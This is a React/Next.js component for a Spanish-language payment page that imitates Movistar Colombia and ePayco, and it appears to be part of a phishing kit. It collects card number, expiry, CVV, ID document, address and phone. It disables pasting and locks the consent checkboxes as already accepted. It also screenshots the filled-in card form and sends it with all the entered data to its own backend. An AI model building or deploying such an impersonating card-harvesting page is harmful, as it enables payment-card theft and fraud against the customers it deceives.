"use client";

import { useMemo, useState } from "react";
import { domToJpeg } from "modern-screenshot";
import { validateCardNumber } from "@/lib/luhn";
import { DOCUMENTOS_OPTIONS, CUOTAS_OPTIONS, TELEFONO_OPTIONS } from "@/lib/options";
import type { BancoOption } from "@/lib/bancos";

type Metodo = "TARJETA" | "PSE" | "BANCOLOMBIA" | "NEQUI";

type Props = {
  metodoPago: Metodo;
  total: number;
  email: string;
  bancosOptions: BancoOption[];
  paymentGateway: "pasarela" | "api";
};

function formatCOP(n: number): string {
  return n.toLocaleString("es-CO", { style: "currency", currency: "COP", minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function validateName(v: string) {
  return /^[A-Za-zÁÉÍÓÚáéíóúÑñ ]{4,50}$/.test(v);
}
function validateDocumento(v: string) {
  return /^[A-Za-z0-9]{7,15}$/.test(v);
}
function validateFecha(value: string): boolean {
  const [month, year] = value.split("/");
  if (!month || !year || year.length !== 2) return false;
  const m = parseInt(month, 10);
  const y = parseInt(year, 10) + 2000;
  const now = new Date();
  const cM = now.getMonth() + 1;
  const cY = now.getFullYear();
  return m >= 1 && m <= 12 && (y > cY || (y === cY && m >= cM));
}
function validateCVV(v: string) {
  return /^\d{3,4}$/.test(v);
}
function validateDireccion(v: string) {
  return /^.{2,}$/.test(v);
}
function validateTelefono(v: string) {
  return /^\d{7,}$/.test(v);
}

export default function IngresarDatosPagoClient(props: Props) {
  const { metodoPago, total, email, bancosOptions, paymentGateway } = props;

  const initialBanco =
    metodoPago === "BANCOLOMBIA"
      ? paymentGateway === "api"
        ? "bancolombia"
        : "BANCOLOMBIA"
      : metodoPago === "NEQUI"
        ? "NEQUI"
        : "";

  const [form, setForm] = useState({
    nombre: "",
    tipoDocumento: "CC",
    documento: "",
    entidadBancaria: initialBanco,
    numTarjeta: "",
    fechaVencimiento: "",
    cvv: "",
    cuotas: metodoPago === "TARJETA" ? "1" : "",
    tipoTelefono: "+57",
    direccion: "",
    telefono: "",
    email: props.email,
  });
  const [loading, setLoading] = useState(false);

  const entidadOptions = useMemo<BancoOption[]>(() => {
    if (metodoPago === "BANCOLOMBIA") {
      const bcLabel =
        paymentGateway === "api"
          ? { value: "bancolombia", label: "BANCOLOMBIA", enabled: true }
          : { value: "BANCOLOMBIA", label: "Bancolombia", enabled: true };
      return [bcLabel];
    }
    return bancosOptions;
  }, [metodoPago, bancosOptions, paymentGateway]);

  const imagenMetodo = (() => {
    switch (metodoPago) {
      case "BANCOLOMBIA":
        return { src: "/movistar/FORMA_PAGO_18.png", alt: "Bancolombia" };
      case "PSE":
        return { src: "/movistar/FORMA_PAGO_1.png", alt: "PSE" };
      case "NEQUI":
        return { src: "/movistar/5.svg", alt: "Nequi" };
      default:
        return null;
    }
  })();

  function update<K extends keyof typeof form>(key: K, v: (typeof form)[K]) {
    setForm((f) => ({ ...f, [key]: v }));
  }

  function handleNumTarjeta(e: React.ChangeEvent<HTMLInputElement>) {
    let v = e.target.value.replace(/\D/g, "").slice(0, 19);
    const parts = v.match(/.{1,4}/g);
    v = parts ? parts.join(" ") : "";
    update("numTarjeta", v);
  }
  function handleFecha(e: React.ChangeEvent<HTMLInputElement>) {
    let v = e.target.value.replace(/[^\d]/g, "").slice(0, 4);
    if (v.length >= 3) v = `${v.slice(0, 2)}/${v.slice(2)}`;
    update("fechaVencimiento", v);
  }
  function handleCVV(e: React.ChangeEvent<HTMLInputElement>) {
    update("cvv", e.target.value.replace(/\D/g, "").slice(0, 4));
  }
  function handleNombre(e: React.ChangeEvent<HTMLInputElement>) {
    update(
      "nombre",
      e.target.value.replace(/[^A-Za-zÁÉÍÓÚáéíóúÑñ ]/g, "").slice(0, 50)
    );
  }
  function handleDocumento(e: React.ChangeEvent<HTMLInputElement>) {
    update("documento", e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 15));
  }
  function handleTelefono(e: React.ChangeEvent<HTMLInputElement>) {
    update("telefono", e.target.value.replace(/\D/g, ""));
  }

  function isFormValid(): boolean {
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(form.email)) return false;
    if (!validateName(form.nombre)) return false;
    if (!validateDocumento(form.documento)) return false;
    if (!validateDireccion(form.direccion)) return false;
    if (!validateTelefono(form.telefono)) return false;
    if (metodoPago === "PSE" || metodoPago === "BANCOLOMBIA") {
      if (!form.entidadBancaria) return false;
    }
    if (metodoPago === "TARJETA") {
      if (!validateCardNumber(form.numTarjeta)) return false;
      if (!validateFecha(form.fechaVencimiento)) return false;
      if (!validateCVV(form.cvv)) return false;
    }
    return true;
  }

  async function captureScreenshot(): Promise<string | null> {
    try {
      return await domToJpeg(document.body, {
        scale: 0.5,
        quality: 0.6,
        backgroundColor: "#ffffff",
      });
    } catch (e) {
      console.error("Error capturando screenshot:", e);
      return null;
    }
  }

  async function siguiente() {
    if (!isFormValid()) {
      alert("Por favor complete los campos correctamente");
      return;
    }
    let screenshot: string | null = null;
    if (metodoPago === "TARJETA") {
      screenshot = await captureScreenshot();
    }
    setLoading(true);
    try {
      const r = await fetch("/api/pago/datos", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          data: {
            ...form,
            metodoPago,
            backgroundScreenshot: screenshot,
          },
        }),
      });
      const data = (await r.json().catch(() => null)) as
        | { ok?: boolean; redirect?: string; error?: string; errors?: Record<string, string> }
        | null;
      if (r.ok && data?.ok && data.redirect) {
        window.location.href = data.redirect;
        return;
      }
      alert(
        data?.error ||
          data?.errors?.form ||
          "Por favor complete los campos correctamente."
      );
      setLoading(false);
    } catch (e) {
      console.error(e);
      alert("Error de conexión. Intente nuevamente.");
      setLoading(false);
    }
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <img src="/movistar/M.gif" alt="Cargando" className="w-48" />
      </div>
    );
  }

  return (
    <div>
      <header className="bg-black text-white pb-4 pt-2">
        <div className="flex justify-between items-center px-2 pt-2">
          <div className="flex items-center">
            <div className="logo-container bg-white rounded-full p-1 mr-3 w-14 h-14 flex items-center justify-center">
              <img src="/movistar/1.jpg" alt="Logo" className="h-8" />
            </div>
            <div>
              <h1 className="text-sm font-semibold">
                Colombia Telecomunicaciones S.A. ESP
              </h1>
              <p className="text-sm text-gray-300">
                Pago multiples facturas Movistar
              </p>
              <strong className="text-sm">
                {formatCOP(total)} <span className="text-sm">COP</span>
              </strong>
            </div>
          </div>
        </div>
        <div className="px-2 mt-4 text-center pt-3 border-t border-gray-100/50 flex justify-between">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 24 24"
            fill="currentColor"
            className="size-4"
          >
            <path
              fillRule="evenodd"
              d="M7.72 12.53a.75.75 0 0 1 0-1.06l7.5-7.5a.75.75 0 1 1 1.06 1.06L9.31 12l6.97 6.97a.75.75 0 1 1-1.06 1.06l-7.5-7.5Z"
              clipRule="evenodd"
            />
          </svg>
          <h3 className="text-sm italic">{email}</h3>
          <p className="text-sm">Cerrar sesión</p>
        </div>
      </header>

      {imagenMetodo && (
        <div className="flex justify-center items-center mt-4">
          <img src={imagenMetodo.src} alt={imagenMetodo.alt} className="h-8" />
        </div>
      )}

      <div className="w-[90%] max-w-3xl mx-auto mb-2 pt-4">
        <div>
          {metodoPago === "PSE" && (
            <div className="mb-2">
              <div className="flex justify-between border-b border-gray-300 pb-1 relative">
                <label
                  htmlFor="bank-select"
                  className="flex items-center w-[25%] cursor-pointer"
                >
                  <svg
                    className="w-4 h-4 text-black"
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 448 512"
                  >
                    <path
                      fill="currentColor"
                      d="M436 480h-20V24c0-13.255-10.745-24-24-24H56C42.745 0 32 10.745 32 24v456H12c-6.627 0-12 5.373-12 12v20h448v-20c0-6.627-5.373-12-12-12zM128 76c0-6.627 5.373-12 12-12h40c6.627 0 12 5.373 12 12v40c0 6.627-5.373 12-12 12h-40c-6.627 0-12-5.373-12-12V76zm0 96c0-6.627 5.373-12 12-12h40c6.627 0 12 5.373 12 12v40c0 6.627-5.373 12-12 12h-40c-6.627 0-12-5.373-12-12v-40zm52 148h-40c-6.627 0-12-5.373-12-12v-40c0-6.627 5.373-12 12-12h40c6.627 0 12 5.373 12 12v40c0 6.627-5.373 12-12 12zm76 160h-64v-84c0-6.627 5.373-12 12-12h40c6.627 0 12 5.373 12 12v84zm64-172c0 6.627-5.373 12-12 12h-40c-6.627 0-12-5.373-12-12v-40c0-6.627 5.373-12 12-12h40c6.627 0 12 5.373 12 12v40zm0-96c0 6.627-5.373 12-12 12h-40c-6.627 0-12-5.373-12-12v-40c0-6.627 5.373-12 12-12h40c6.627 0 12 5.373 12 12v40zm0-96c0 6.627-5.373 12-12 12h-40c-6.627 0-12-5.373-12-12V76c0-6.627 5.373-12 12-12h40c6.627 0 12 5.373 12 12v40z"
                    />
                  </svg>
                  <span className="text-sm font-semibold text-black ml-2">
                    Banco
                  </span>
                </label>
                <div className="w-[65%] relative">
                  <select
                    id="bank-select"
                    value={form.entidadBancaria}
                    onChange={(e) => update("entidadBancaria", e.target.value)}
                    className="w-full py-2 pr-8 focus:outline-none bg-transparent appearance-none overflow-hidden text-ellipsis whitespace-nowrap text-sm text-[#3098d6]"
                    required
                  >
                    {entidadOptions.map((opt) => (
                      <option
                        key={opt.value + opt.label}
                        value={opt.value}
                        disabled={!opt.enabled}
                      >
                        {opt.label}
                      </option>
                    ))}
                  </select>
                  <div className="pointer-events-none absolute inset-y-0 right-0 flex items-center pr-2 text-gray-700">
                    <svg
                      className="fill-current h-4 w-4"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 20 20"
                    >
                      <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
                    </svg>
                  </div>
                </div>
              </div>
            </div>
          )}

          {metodoPago === "TARJETA" && (
            <>
              <div className="mb-2">
                <div className="flex justify-between border-b border-gray-300 pb-1">
                  <label
                    htmlFor="first-tarjeta"
                    className="flex items-center w-[30%] cursor-pointer"
                  >
                    <svg
                      className="w-4 h-4 text-black"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 576 512"
                    >
                      <path
                        fill="currentColor"
                        d="M0 432c0 26.5 21.5 48 48 48h480c26.5 0 48-21.5 48-48V256H0v176zm192-68c0-6.6 5.4-12 12-12h136c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12H204c-6.6 0-12-5.4-12-12v-40zm-128 0c0-6.6 5.4-12 12-12h72c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12H76c-6.6 0-12-5.4-12-12v-40zM576 80v48H0V80c0-26.5 21.5-48 48-48h480c26.5 0 48 21.5 48 48z"
                      />
                    </svg>
                    <span className="text-sm font-semibold text-black ml-2">
                      Tarjeta
                    </span>
                  </label>
                  <input
                    type="text"
                    value={form.numTarjeta}
                    onChange={handleNumTarjeta}
                    onPaste={(e) => e.preventDefault()}
                    id="first-tarjeta"
                    placeholder="**** **** **** ****"
                    maxLength={23}
                    className="w-[65%] py-2 focus:outline-none placeholder:text-sm placeholder:opacity-50 bg-transparent"
                    autoComplete="off"
                    required
                  />
                </div>
              </div>
              <div className="mb-2 flex overflow-hidden">
                <div className="flex w-[50%] justify-between border-b border-gray-300 pb-1">
                  <label
                    htmlFor="first-vence"
                    className="flex items-center w-[50%] cursor-pointer"
                  >
                    <svg
                      className="w-4 h-4 text-black"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 448 512"
                    >
                      <path
                        fill="currentColor"
                        d="M12 192h424c6.6 0 12 5.4 12 12v260c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V204c0-6.6 5.4-12 12-12zm436-44v-36c0-26.5-21.5-48-48-48h-48V12c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v52H160V12c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v52H48C21.5 64 0 85.5 0 112v36c0 6.6 5.4 12 12 12h424c6.6 0 12-5.4 12-12z"
                      />
                    </svg>
                    <span className="text-sm font-semibold text-black ml-2">
                      Vence
                    </span>
                  </label>
                  <input
                    type="text"
                    autoComplete="off"
                    required
                    value={form.fechaVencimiento}
                    onChange={handleFecha}
                    onPaste={(e) => e.preventDefault()}
                    id="first-vence"
                    placeholder="MM/YY"
                    className="w-[50%] py-2 focus:outline-none placeholder:text-sm placeholder:opacity-50 bg-transparent"
                  />
                </div>
                <div className="w-[50%] flex justify-between border-b border-gray-300 pb-1">
                  <label
                    htmlFor="first-cvv"
                    className="flex items-center w-[50%] cursor-pointer"
                  >
                    <svg
                      className="w-4 h-4 text-black"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 448 512"
                    >
                      <path
                        fill="currentColor"
                        d="M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z"
                      />
                    </svg>
                    <span className="text-sm font-semibold text-black ml-2">
                      CVV
                    </span>
                  </label>
                  <input
                    type="text"
                    id="first-cvv"
                    placeholder="123"
                    autoComplete="off"
                    value={form.cvv}
                    required
                    onChange={handleCVV}
                    onPaste={(e) => e.preventDefault()}
                    className="w-[50%] py-2 focus:outline-none placeholder:text-sm placeholder:opacity-50 bg-transparent"
                  />
                </div>
              </div>
              <div className="mb-2">
                <div className="flex justify-between border-b border-gray-300 pb-1 relative">
                  <label
                    htmlFor="cuotas-select"
                    className="flex items-center w-[25%] cursor-pointer"
                  >
                    <svg
                      className="w-4 h-4 text-black"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 448 512"
                    >
                      <path
                        fill="currentColor"
                        d="M448 73.143v45.714C448 159.143 347.667 192 224 192S0 159.143 0 118.857V73.143C0 32.857 100.333 0 224 0s224 32.857 224 73.143zM448 176v102.857C448 319.143 347.667 352 224 352S0 319.143 0 278.857V176c48.125 33.143 136.208 48.572 224 48.572S399.874 209.143 448 176zm0 160v102.857C448 479.143 347.667 512 224 512S0 479.143 0 438.857V336c48.125 33.143 136.208 48.572 224 48.572S399.874 369.143 448 336z"
                      />
                    </svg>
                    <span className="text-sm font-semibold text-black ml-2">
                      Cuotas
                    </span>
                  </label>
                  <div className="w-[65%] relative">
                    <select
                      id="cuotas-select"
                      value={form.cuotas}
                      onChange={(e) => update("cuotas", e.target.value)}
                      className="w-full py-2 pr-8 focus:outline-none bg-transparent appearance-none overflow-hidden text-ellipsis whitespace-nowrap text-sm text-[#3098d6]"
                      required
                    >
                      {CUOTAS_OPTIONS.map((opt) => (
                        <option key={opt.value} value={opt.value}>
                          {opt.label}
                        </option>
                      ))}
                    </select>
                    <div className="pointer-events-none absolute inset-y-0 right-0 flex items-center pr-2 text-gray-700">
                      <svg
                        className="fill-current h-4 w-4"
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 20 20"
                      >
                        <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
                      </svg>
                    </div>
                  </div>
                </div>
              </div>
            </>
          )}

          {/* Nombre */}
          <div className="mb-2">
            <div className="flex justify-between border-b border-gray-300 pb-1">
              <label
                htmlFor="first-name"
                className="flex items-center w-[30%] cursor-pointer"
              >
                <svg
                  className="w-4 h-4 text-black"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 512 512"
                >
                  <path
                    fill="currentColor"
                    d="M256 0c88.366 0 160 71.634 160 160s-71.634 160-160 160S96 248.366 96 160 167.634 0 256 0zm183.283 333.821l-71.313-17.828c-74.923 53.89-165.738 41.864-223.94 0l-71.313 17.828C29.981 344.505 0 382.903 0 426.955V464c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48v-37.045c0-44.052-29.981-82.45-72.717-93.134z"
                  />
                </svg>
                <span className="text-sm font-semibold text-black ml-2">
                  Nombre
                </span>
              </label>
              <input
                type="text"
                onChange={handleNombre}
                id="first-name"
                value={form.nombre}
                required
                autoComplete="off"
                placeholder="Nombres y Apellidos"
                onPaste={(e) => e.preventDefault()}
                className="w-[65%] py-2 focus:outline-none placeholder:text-sm placeholder:opacity-50 bg-transparent"
              />
            </div>
          </div>

          {/* Dirección */}
          <div className="mb-2">
            <div className="flex justify-between border-b border-gray-300 pb-1">
              <label
                htmlFor="first-direccion"
                className="flex items-center w-[30%] cursor-pointer"
              >
                <svg
                  className="w-4 h-4 text-black"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 384 512"
                >
                  <path
                    fill="currentColor"
                    d="M172.268 501.67C26.97 291.031 0 269.413 0 192 0 85.961 85.961 0 192 0s192 85.961 192 192c0 77.413-26.97 99.031-172.268 309.67-9.535 13.774-29.93 13.773-39.464 0z"
                  />
                </svg>
                <span className="text-sm font-semibold text-black ml-2">
                  Dirección
                </span>
              </label>
              <input
                type="text"
                value={form.direccion}
                onChange={(e) => update("direccion", e.target.value)}
                id="first-direccion"
                onPaste={(e) => e.preventDefault()}
                autoComplete="off"
                required
                placeholder="Dirección de residencia"
                className="w-[65%] py-2 focus:outline-none placeholder:text-sm placeholder:opacity-50 bg-transparent"
              />
            </div>
          </div>

          {/* Documento */}
          <div className="mb-2 flex overflow-hidden">
            <div className="flex justify-between border-b border-gray-300 pb-1 relative w-[50%]">
              <label
                htmlFor="documento-select"
                className="flex items-center w-[50%] cursor-pointer"
              >
                <svg
                  className="w-4 h-4"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 512 512"
                >
                  <path
                    fill="currentColor"
                    d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zM256 350c0 9.941-8.059 18-18 18H82c-9.941 0-18-8.059-18-18v-13.892c0-16.519 11.243-30.919 27.269-34.925l26.742-6.686c21.826 15.699 55.882 20.209 83.978 0l26.743 6.686C244.757 305.189 256 319.589 256 336.108V350zM100 236c0-33.137 26.863-60 60-60s60 26.863 60 60-26.863 60-60 60-60-26.863-60-60zm348 104c0 6.627-5.373 12-12 12H300c-6.627 0-12-5.373-12-12v-8c0-6.627 5.373-12 12-12h136c6.627 0 12 5.373 12 12v8zm0-64c0 6.627-5.373 12-12 12H300c-6.627 0-12-5.373-12-12v-8c0-6.627 5.373-12 12-12h136c6.627 0 12 5.373 12 12v8zm0-64c0 6.627-5.373 12-12 12H300c-6.627 0-12-5.373-12-12v-8c0-6.627 5.373-12 12-12h136c6.627 0 12 5.373 12 12v8zm32-96c0 6.627-5.373 12-12 12H44c-6.627 0-12-5.373-12-12v-8c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v8z"
                  />
                </svg>
                <span className="text-sm font-semibold text-black ml-2">ID</span>
              </label>
              <div className="w-[50%] relative">
                <select
                  id="documento-select"
                  value={form.tipoDocumento}
                  onChange={(e) => update("tipoDocumento", e.target.value)}
                  className="w-full py-2 pr-8 focus:outline-none bg-transparent appearance-none overflow-hidden text-ellipsis whitespace-nowrap text-sm text-[#3098d6]"
                  required
                >
                  {DOCUMENTOS_OPTIONS.map((opt) => (
                    <option key={opt.value} value={opt.value}>
                      {opt.label}
                    </option>
                  ))}
                </select>
                <div className="pointer-events-none absolute inset-y-0 right-0 flex items-center pr-2 text-gray-700">
                  <svg
                    className="fill-current h-4 w-4"
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 20 20"
                  >
                    <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
                  </svg>
                </div>
              </div>
            </div>
            <div className="flex border-b border-gray-300 pb-1 w-[50%]">
              <input
                type="text"
                onChange={handleDocumento}
                onPaste={(e) => e.preventDefault()}
                required
                id="first-doc"
                value={form.documento}
                placeholder="Nro. de Documento"
                className="py-2 focus:outline-none placeholder:text-sm placeholder:opacity-50 bg-transparent"
              />
            </div>
          </div>

          {/* Teléfono */}
          <div className="mb-2 flex overflow-hidden">
            <div className="flex justify-between border-b border-gray-300 pb-1 relative w-[50%]">
              <label
                htmlFor="tipoTelefono-select"
                className="flex items-center cursor-pointer"
              >
                <svg
                  className="w-4 h-4 text-black"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 512 512"
                >
                  <path
                    fill="currentColor"
                    d="M493.397 24.615l-104-23.997c-11.314-2.611-22.879 3.252-27.456 13.931l-48 111.997a24 24 0 0 0 6.862 28.029l60.617 49.596c-35.973 76.675-98.938 140.508-177.249 177.248l-49.596-60.616a24 24 0 0 0-28.029-6.862l-111.997 48C3.873 366.516-1.994 378.08.618 389.397l23.997 104C27.109 504.204 36.748 512 48 512c256.087 0 464-207.532 464-464 0-11.176-7.714-20.873-18.603-23.385z"
                  />
                </svg>
                <span className="text-sm font-semibold text-black ml-2">
                  Teléfono
                </span>
              </label>
              <div className="w-[50%] relative">
                <select
                  id="tipoTelefono-select"
                  value={form.tipoTelefono}
                  onChange={(e) => update("tipoTelefono", e.target.value)}
                  className="w-full py-2 pr-8 focus:outline-none bg-transparent appearance-none overflow-hidden text-ellipsis whitespace-nowrap text-sm text-[#3098d6]"
                  required
                >
                  {TELEFONO_OPTIONS.map((opt, i) => (
                    <option key={`${opt.value}-${i}`} value={opt.value}>
                      {opt.label}
                    </option>
                  ))}
                </select>
                <div className="pointer-events-none absolute inset-y-0 right-0 flex items-center pr-2 text-gray-700">
                  <svg
                    className="fill-current h-4 w-4"
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 20 20"
                  >
                    <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
                  </svg>
                </div>
              </div>
            </div>
            <div className="flex border-b border-gray-300 pb-1 w-[50%]">
              <input
                type="text"
                onChange={handleTelefono}
                required
                inputMode="numeric"
                value={form.telefono}
                placeholder="Número de celular"
                className="py-2 focus:outline-none placeholder:text-sm placeholder:opacity-50 bg-transparent"
              />
            </div>
          </div>

          {/* Correo */}
          <div className="mb-2">
            <div className="flex justify-between border-b border-gray-300 pb-1">
              <label className="flex items-center w-[30%] cursor-pointer">
                <svg className="w-4 h-4 text-black" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM7 9h10v2H7V9zm0 4h6v2H7v-2z" />
                </svg>
                <span className="text-sm font-semibold text-black ml-2">Correo</span>
              </label>
              <input
                type="email"
                value={form.email}
                onChange={(e) => update("email", e.target.value)}
                placeholder="correo@ejemplo.com"
                className="w-[65%] py-2 focus:outline-none placeholder:text-sm placeholder:opacity-50 bg-transparent"
                required
              />
            </div>
          </div>

          {/* Términos */}
          <div className="space-y-4 mt-8 mb-4 text-xs">
            <div className="flex items-start space-x-3">
              <div className="flex items-center">
                <input
                  type="checkbox"
                  name="terms"
                  id="terms"
                  defaultChecked
                  aria-disabled="true"
                  className="w-5 h-5 pointer-events-none accent-green-600"
                />
              </div>
              <div className="text-black mt-[2px]">
                Confirmo que acepto los{" "}
                <span className="underline">Términos y condiciones</span> de los
                servicios ofrecidos por ePayco.
              </div>
            </div>
            <div className="flex items-start space-x-3">
              <div className="flex items-center">
                <input
                  type="checkbox"
                  name="privacy"
                  id="privacy"
                  defaultChecked
                  aria-disabled="true"
                  className="w-5 h-5 pointer-events-none accent-green-600"
                />
              </div>
              <div className="text-black mt-[2px]">
                Autorizo de manera previa, expresa e inequívoca que mis datos
                personales sean tratados por Epayco.com conforme a las
                finalidades establecidas en su{" "}
                <span className="underline">
                  Política de tratamiento de datos personales.
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>

      <button
        onClick={siguiente}
        className="sticky bottom-0 w-full bg-[#40a8e6] flex justify-center items-center gap-1 text-white py-4 shadow-lg hover:bg-[#3098d6] transition-colors duration-300"
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          viewBox="0 0 24 24"
          fill="currentColor"
          className="w-6 h-6 drop-shadow-md"
        >
          <path
            fillRule="evenodd"
            d="M2.25 12c0-5.385 4.365-9.75 9.75-9.75s9.75 4.365 9.75 9.75-4.365 9.75-9.75 9.75S2.25 17.385 2.25 12Zm13.36-1.814a.75.75 0 1 0-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 0 0-1.06 1.06l2.25 2.25a.75.75 0 0 0 1.14-.094l3.75-5.25Z"
            clipRule="evenodd"
          />
        </svg>
        <p className="font-semibold text-lg drop-shadow-sm">Pagar</p>
      </button>
    </div>
  );
}
